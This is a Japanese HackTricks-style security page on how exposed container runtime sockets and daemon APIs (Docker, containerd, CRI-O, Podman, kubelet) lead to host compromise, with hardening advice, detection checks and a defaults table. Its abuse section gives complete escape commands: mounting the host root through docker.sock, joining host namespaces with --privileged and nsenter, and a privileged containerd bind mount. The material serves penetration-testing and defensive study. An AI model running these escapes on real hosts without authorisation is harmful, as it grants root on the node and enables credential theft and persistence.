# ランタイム API とデーモンの露出

{{#include ../../../banners/hacktricks-training.md}}

## 概要

多くの実際のコンテナ侵害は、そもそも namespace escape から始まるわけではありません。それらはランタイム制御プレーンへのアクセスから始まります。ワークロードがマウントされた Unix ソケットや公開された TCP リスナーを通じて `dockerd`, `containerd`, CRI-O, Podman, または kubelet と通信できる場合、攻撃者はより高い特権を持つ新しいコンテナを要求したり、ホストのファイルシステムをマウントしたり、ホストの namespaces に参加したり、機密性の高いノード情報を取得したりできる可能性があります。その場合、ランタイム API が真のセキュリティ境界となり、それを侵害することは実質的にホストを侵害することに近くなります。

このため、ランタイムソケットの露出はカーネル保護とは別に記録されるべきです。通常の seccomp、capabilities、MAC confinement を持つコンテナでも、コンテナ内に `/var/run/docker.sock` や `/run/containerd/containerd.sock` がマウントされていれば、ホスト侵害まで API コール一回で到達する可能性があります。現在のコンテナのカーネルによる分離は設計どおりに機能しているかもしれませんが、ランタイム管理プレーンが完全に露出したままであることがあります。

## デーモンへのアクセスモデル

Docker Engine は伝統的に特権 API をローカルの Unix ソケット `unix:///var/run/docker.sock` を通じて公開します。歴史的には `tcp://0.0.0.0:2375` のような TCP リスナーや、`2376` 上の TLS 保護されたリスナーを通じてリモート公開されることもありました。強力な TLS とクライアント認証なしにデーモンをリモート公開すると、実質的に Docker API がリモート root インターフェースになってしまいます。

`containerd`, CRI-O, Podman, および kubelet は同様に影響の大きいインタフェースを公開します。名前やワークフローは異なりますが、ロジックは変わりません。もしインタフェースが呼び出し元にワークロードの作成、ホストパスのマウント、資格情報の取得、実行中コンテナの変更を許すなら、そのインタフェースは特権のある管理チャネルであり、それに応じて扱うべきです。

確認すべき一般的なローカルパスは次のとおりです:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Older or more specialized stacks may also expose endpoints such as `dockershim.sock`, `frakti.sock`, or `rktlet.sock`. Those are less common in modern environments, but when encountered they should be treated with the same caution because they represent runtime-control surfaces rather than ordinary application sockets.

## 安全なリモートアクセス

もしデーモンをローカルソケット以外に公開する必要がある場合、接続は TLS で保護すべきであり、できれば相互認証を用いてデーモンがクライアントを、クライアントがデーモンを検証するようにしてください。利便性のために Docker デーモンを平文の HTTP で公開する古い習慣は、API の表面が直接特権コンテナを作成できるほど強力であるため、コンテナ管理における最も危険な間違いの一つです。

The historical Docker configuration pattern looked like:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
On systemd-based hosts, daemon communication may also appear as `fd://`, meaning the process inherits a pre-opened socket from systemd rather than binding it directly itself. The important lesson is not the exact syntax but the security consequence. The moment the daemon listens beyond a tightly permissioned local socket, transport security and client authentication become mandatory rather than optional hardening.

## 悪用

ランタイムソケットが存在する場合、それがどれか、互換性のあるクライアントが存在するか、raw HTTP や gRPC でのアクセスが可能かどうかを確認してください:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
これらのコマンドは、無効なパス、マウントされているがアクセス不能な socket、そして稼働中の特権付き API を区別できるため有用です。クライアントが成功した場合、次の問題は API が host bind mount や host namespace sharing を使って新しい container を起動できるかどうかです。

### 完全な例: Docker Socket To Host Root

`docker.sock` にアクセスできる場合、古典的なエスケープはホストのルートファイルシステムをマウントする新しい container を起動し、次に `chroot` することです:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
これは Docker daemon を通じてホスト上での直接的な root 実行を可能にします。影響はファイルの読み取りにとどまりません。新しい container 内に入ると、攻撃者はホストのファイルを改ざんしたり、資格情報を収集したり、持続化を仕込んだり、追加の特権付きワークロードを起動したりできます。

### 完全な例: Docker Socket To Host Namespaces

攻撃者がファイルシステムのみのアクセスの代わりに namespace へのエントリを望む場合：
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
この経路は、現在のものを悪用するのではなく、ランタイムに対してホスト名前空間を明示的に公開する新しいコンテナを作成するよう要求することでホストに到達します。

### 完全な例: containerd Socket

マウントされた `containerd` socket は通常同様に危険です:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
影響は再びホストの侵害です。Docker 固有のツールが存在しない場合でも、別の runtime API が同じ管理権限を提供する可能性があります。

## チェック

これらのチェックの目的は、コンテナが信頼境界の外にあるはずの管理プレーンに到達できるかどうかを判定することです。
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
ここで興味深い点:

- マウントされたランタイムソケットは、単なる情報開示ではなく通常は直接的な管理用プリミティブである。
- TLSなしでポート `2375` で待ち受けるTCPリスナーは、リモートでの妥協状態として扱うべきである。
- `DOCKER_HOST` のような環境変数は、ワークロードが意図的にホストのランタイムと通信するよう設計されていることを示すことが多い。

## ランタイムのデフォルト

| Runtime / platform | デフォルトの状態 | デフォルトの挙動 | よくある手動での弱化 |
| --- | --- | --- | --- |
| Docker Engine | デフォルトでローカルUnixソケット | `dockerd` はローカルソケットで待ち受け、デーモンは通常 root 権限で動作する | `/var/run/docker.sock` のマウント、`tcp://...:2375` の公開、`2376` 上でのTLSが弱いか存在しないこと |
| Podman | デフォルトでデーモンレスなCLI | 通常のローカル利用では長時間稼働する特権デーモンは不要。ただし `podman system service` を有効にするとAPIソケットが公開されることがある | `podman.sock` の公開、サービスを広く実行すること、root 権限でのAPI利用 |
| containerd | ローカルの特権ソケット | ローカルソケットを通じて管理APIが公開され、通常は上位のツールリングから利用される | `containerd.sock` のマウント、`ctr` や `nerdctl` への広範なアクセス、特権付き名前空間の露出 |
| CRI-O | ローカルの特権ソケット | CRI エンドポイントはノードローカルの信頼されたコンポーネント向けを想定している | `crio.sock` のマウント、信頼されていないワークロードへCRIエンドポイントを公開すること |
| Kubernetes kubelet | ノードローカルの管理API | Kubelet はPodから広く到達可能であってはならない。アクセスされると、認証/認可（authn/authz）に応じて、Podの状態、認証情報、実行機能が露出する可能性がある | kubelet ソケットや証明書のマウント、脆弱な kubelet 認証、ホストネットワーキングと到達可能な kubelet エンドポイントの組み合わせ |
